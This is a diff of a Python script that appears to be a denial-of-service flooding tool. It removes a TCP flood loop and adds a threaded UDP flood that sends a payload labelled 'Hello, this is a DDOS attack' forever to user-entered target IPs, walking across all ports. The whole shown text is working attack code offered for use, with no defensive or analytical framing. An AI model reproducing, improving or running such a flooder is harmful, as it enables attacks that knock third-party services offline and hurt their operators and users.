@@ -64,25 +64,42 @@ print("\033[97m                  ⟩⟩  penetrate security layer \033[0m "),
 time.sleep(5),
 print("\033[95m                  ⟩⟩  send Packet \033[0m "),
 time.sleep(5),
-def function():
-	data = random._urandom(818)
-	i = random.choice(("[✴️]","[#]"))
-	while True:
-		try:
-			
-                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print("\033[32m[✴️\033[32m]   Ririe  \033[94m" +str(u)+ "  \033[33mSent Packet  \033[91m" +ip+ "\033[0m" )
-                        print("\033[33m————————————————————————————————————————————————————————🚀\033[0m")
-                        print("\033[93m[✴️\033[93m]   Ririe  \033[92m" +str(u)+ "  \033[32mAttack Wabs  \033[95m" +ip+ "\033[0m" )
-                        print("\033[94m————————————————————————————————————————————————————————🚀\033[0m")
-                        print("\033[95m[✴️\033[95m]   Ririr  \033[96m" +str(u)+ "  \033[92mRequest Target  \033[32m" +ip+ "\033[0m" )
-                        print("\033[31m————————————————————————————————————————————————————————🚀\033[0m")
-			print( +"Attack Sent!!!")
-		except:
-			s.close()
-			print("[*] Error!!!")
-											
+# Date and Time Declaration and Initialization
+mydate = time.strftime('%Y-%m-%d')
+mytime = time.strftime('%H-%M')
+
+# Lets define sock and bytes for our attack
+def send_packets(ip, port, data, proxy_size):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sent = 0
+    while True:
+        for i in range(proxy_size):
+            sock.sendto(data, (ip, port))
+            sent += 1
+            port += 1
+            if port == 65534:
+                port = 1
+
+# Type your ip and port number (find IP address using nslookup or any online website)
+ips = input("IP Targets (separated by commas): ").split(',')
+ports = input("Ports (separated by commas): ").split(',')
+proxy_size = int(input("Proxy Size : "))
+threads = int(input("Number of threads : "))
+
+
+time.sleep(3)
+for ip in ips:
+    for port in ports:
+        # Use a bytes literal to create the data
+        data = b'Hello, this is a DDOS attack'
+        print("Starting the attack on ", ip, " at port ", port, " with a proxy size of ", proxy_size, "...")
+        for i in range(threads):
+            t = threading.Thread(target=send_packets, args=(ip, int(port), data, proxy_size))
+            t.start()           
+
+# Lets keep the terminal clean
+if os.name == "nt": # Windows
+    os.system("cls")
+else: # Linux or Mac
+    os.system("clear")
+input("Press Enter to exit...")
